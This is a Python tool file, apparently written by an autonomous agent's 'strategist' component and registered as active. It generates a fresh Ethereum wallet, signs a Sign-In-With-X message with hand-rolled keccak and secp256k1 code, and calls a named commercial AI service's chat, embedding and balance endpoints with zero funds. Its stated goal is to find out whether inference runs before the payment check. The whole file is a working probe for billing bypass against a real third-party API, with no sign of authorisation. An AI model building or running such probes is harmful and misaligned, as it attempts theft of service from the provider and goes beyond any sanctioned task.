"""VOIDFORGE :: forged tool — siwx_inference_v8
SIWX identity on INFERENCE endpoints: fresh wallet+SIWX, POST chat/completions + embeddings with 0 balance — tests if execution happens before balance check (free inference) or 402 gate
Forged by the strategist on 2026-09-01. Edit freely; delete the file to disarm.
"""
import json, re, time, urllib.request, urllib.error


def run(**kwargs):
    import os, base64, ssl, traceback, json, time
    try:
        base = "https://api.venice.ai"
        ctx = ssl.create_default_context()
        UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        def keccak256(data):
            try:
                from Crypto.Hash import keccak
                k = keccak.new(digest_bits=256)
                k.update(data)
                return k.digest()
            except Exception:
                pass
            try:
                import sha3
                return sha3.keccak_256(data).digest()
            except Exception:
                pass
            RC = [0x0000000000000001,0x0000000000008082,0x800000000000808A,0x8000000080008000,0x000000000000808B,0x0000000080000001,0x8000000080008081,0x8000000000008009,0x000000000000008A,0x0000000000000088,0x0000000080008009,0x000000008000000A,0x000000008000808B,0x800000000000008B,0x8000000000008089,0x8000000000008003,0x8000000000008002,0x8000000000000080,0x000000000000800A,0x800000008000000A,0x8000000080008081,0x8000000000008080,0x0000000080000001,0x8000000080008008]
            ROT = [[0,36,3,41,18],[1,44,10,45,2],[62,6,43,15,61],[28,55,25,21,56],[27,20,39,8,14]]
            def rol(x, n):
                n = n % 64
                return ((x << n) | (x >> (64 - n))) & 0xFFFFFFFFFFFFFFFF
            state = [0] * 25
            rate = 136
            padded = bytearray(data)
            padded.append(1)
            while len(padded) % rate != 0:
                padded.append(0)
            padded[-1] = padded[-1] | 128
            for bs in range(0, len(padded), rate):
                block = padded[bs:bs + rate]
                for i in range(rate // 8):
                    state[i] = state[i] ^ int.from_bytes(block[i*8:(i+1)*8], "little")
                for rnd in range(24):
                    C = [state[x] ^ state[x+5] ^ state[x+10] ^ state[x+15] ^ state[x+20] for x in range(5)]
                    D = [C[(x-1) % 5] ^ rol(C[(x+1) % 5], 1) for x in range(5)]
                    for x in range(5):
                        for y in range(5):
                            state[x + 5*y] = state[x + 5*y] ^ D[x]
                    B = [0] * 25
                    for x in range(5):
                        for y in range(5):
                            B[y + 5*((2*x + 3*y) % 5)] = rol(state[x + 5*y], ROT[x][y])
                    for x in range(5):
                        for y in range(5):
                            state[x + 5*y] = B[x + 5*y] ^ ((~B[(x+1) % 5 + 5*y]) & B[(x+2) % 5 + 5*y])
                    state[0] = state[0] ^ RC[rnd]
            return b"".join(state[i].to_bytes(8, "little") for i in range(4))
        P = 2**256 - 2**32 - 977
        N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
        G = (0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798, 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8)
        def inv(a, m):
            return pow(a, m - 2, m)
        def padd(p, q):
            if p is None:
                return q
            if q is None:
                return p
            if p[0] == q[0] and (p[1] + q[1]) % P == 0:
                return None
            if p == q:
                l = 3 * p[0] * p[0] % P * inv(2 * p[1], P) % P
            else:
                l = (q[1] - p[1]) * inv((q[0] - p[0]) % P, P) % P
            x = (l * l - p[0] - q[0]) % P
            return (x, (l * (p[0] - x) - p[1]) % P)
        def pmul(k, pt):
            r = None
            k = k % N
            while k:
                if k & 1:
                    r = padd(r, pt)
                pt = padd(pt, pt)
                k = k >> 1
            return r
        def to_checksum(addr):
            a = addr.lower().replace("0x", "")
            h = keccak256(a.encode()).hex()
            out = "0x"
            for i in range(len(a)):
                c = a[i]
                if c in "0123456789":
                    out = out + c
                else:
                    if int(h[i], 16) >= 8:
                        out = out + c.upper()
                    else:
                        out = out + c
            return out
        def addr_from_priv(d):
            pub = pmul(d, G)
            return "0x" + keccak256(pub[0].to_bytes(32, "big") + pub[1].to_bytes(32, "big"))[12:].hex()
        def sign_eip191(msg_bytes, d):
            z = int.from_bytes(keccak256(b"\x19Ethereum Signed Message:\n" + str(len(msg_bytes)).encode() + msg_bytes), "big")
            k = int.from_bytes(keccak256(d.to_bytes(32, "big") + z.to_bytes(32, "big") + os.urandom(8)), "big") % N
            R = pmul(k, G)
            r = R[0] % N
            s = inv(k, N) * (z + r * d) % N
            recid = R[1] & 1
            if s > N // 2:
                s = N - s
                recid = recid ^ 1
            return r, s, 27 + recid
        def http(url, headers=None, body=None):
            h = dict()
            h["User-Agent"] = UA
            h["Accept"] = "application/json"
            if headers:
                for kk in headers:
                    h[kk] = headers[kk]
            data = None
            if body is not None:
                data = json.dumps(body).encode()
                h["Content-Type"] = "application/json"
            req = urllib.request.Request(url, headers=h, data=data)
            try:
                with urllib.request.urlopen(req, timeout=30, context=ctx) as resp:
                    return resp.status, resp.read().decode("utf-8", "replace")
            except urllib.error.HTTPError as e:
                return e.code, e.read().decode("utf-8", "replace")
            except Exception as e2:
                return 0, "TRANSPORT_ERR: " + str(e2)
        out = dict()
        d = int.from_bytes(os.urandom(32), "big") % N
        my = to_checksum(addr_from_priv(d))
        out["wallet"] = my
        st, body = http(base + "/api/v1/x402/balance/" + my)
        ch = json.loads(body)
        info = ch["extensions"]["sign-in-with-x"]["info"]
        msg = (info["domain"] + " wants you to sign in with your Ethereum account:\n" + my + "\n\n" + info.get("statement", "Sign in to Venice AI") + "\n\nURI: " + info["uri"] + "\nVersion: " + info.get("version", "1") + "\nChain ID: 8453\nNonce: " + info["nonce"] + "\nIssued At: " + info["issuedAt"] + "\nExpiration Time: " + info["expirationTime"])
        r, s, v = sign_eip191(msg.encode(), d)
        sig = "0x" + r.to_bytes(32, "big").hex() + s.to_bytes(32, "big").hex() + bytes([v]).hex()
        pl = dict()
        pl["domain"] = info["domain"]
        pl["address"] = my
        pl["statement"] = info.get("statement", "Sign in to Venice AI")
        pl["uri"] = info["uri"]
        pl["version"] = info.get("version", "1")
        pl["chainId"] = "eip155:8453"
        pl["type"] = "eip191"
        pl["nonce"] = info["nonce"]
        pl["issuedAt"] = info["issuedAt"]
        pl["expirationTime"] = info["expirationTime"]
        pl["signature"] = sig
        siwx = base64.b64encode(json.dumps(pl).encode()).decode()
        hdr = dict()
        hdr["SIGN-IN-WITH-X"] = siwx
        chat_body = dict()
        chat_body["model"] = "venice-uncensored:free"
        chat_body["messages"] = [dict(role="user", content="Say OK")]
        st1, b1 = http(base + "/api/v1/chat/completions", hdr, chat_body)
        out["chat_status"] = st1
        out["chat_body"] = b1[:500]
        emb_body = dict()
        emb_body["model"] = "text-embedding-bge-m3"
        emb_body["input"] = "test"
        st2, b2 = http(base + "/api/v1/embeddings", hdr, emb_body)
        out["embeddings_status"] = st2
        out["embeddings_body"] = b2[:300]
        st3, b3 = http(base + "/api/v1/models", hdr)
        out["models_with_siwx_status"] = st3
        st4, b4 = http(base + "/api/v1/x402/balance/" + my, hdr)
        out["balance_after_status"] = st4
        out["balance_after_body"] = b4[:300]
        return json.dumps(out)
    except Exception:
        return "FATAL: " + traceback.format_exc()[:1400]


from tools import register as _vf_register
_vf_register('forged_siwx_inference_v8', 'SIWX identity on INFERENCE endpoints: fresh wallet+SIWX, POST chat/completions + embeddings with 0 balance — tests if execution happens before balance check (free inference) or 402 gate', {'properties': {}, 'required': [], 'type': 'object'}, 'active')(run)
